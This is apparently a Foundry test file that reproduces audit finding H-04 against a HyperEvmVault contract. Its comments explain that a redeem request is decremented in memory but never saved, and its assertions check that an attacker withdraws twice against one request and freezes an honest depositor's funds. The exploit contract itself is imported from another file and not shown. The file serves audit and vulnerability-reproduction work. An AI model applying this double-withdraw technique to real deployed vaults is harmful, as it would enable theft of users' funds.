// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {Exploit, HyperEvmVault, Escrow, MiniUSDC, Victim} from
    "./61457-h-04-malicious-users-may-block-other-withdrawals-pashov-audi.sol";

// Blueberry H-04 (finding 61457): HyperEvmVault._beforeWithdraw loads the
// RedeemRequest into MEMORY, decrements it, but never writes it back to storage.
// A user who requests a redeem of 1000 can call withdraw twice against the stale
// request, draining the shared Escrow beyond their reservation and blocking an
// honest depositor's withdrawal.
contract Finding61457Test is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_staleRedeemRequest_blocksOtherWithdrawals() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("stored request.assets after full redeem", e.storedAssetsAfterFullRedeem());
        emit log_named_uint("attacker withdrawn (against one 1000 request)", e.attackerWithdrawn());
        emit log_named_uint("frozen at sink", e.frozenAtSink());

        // the request was NOT cleared after a full withdraw -> the core bug
        assertEq(e.storedAssetsAfterFullRedeem(), 1000e6, "redeem request should have been left stale");
        // attacker pulled 2x its single reservation out of the shared Escrow
        assertEq(e.attackerWithdrawn(), 2000e6, "attacker over-withdrew against the stale request");
        // honest depositor's withdrawal is blocked (their funds are frozen)
        assertTrue(e.victimBlocked(), "honest withdrawal should be blocked");
        // frozen magnitude recorded at the sink
        assertEq(e.usdc().balanceOf(SINK), 1000e6, "frozen harm magnitude not recorded at sink");
    }
}
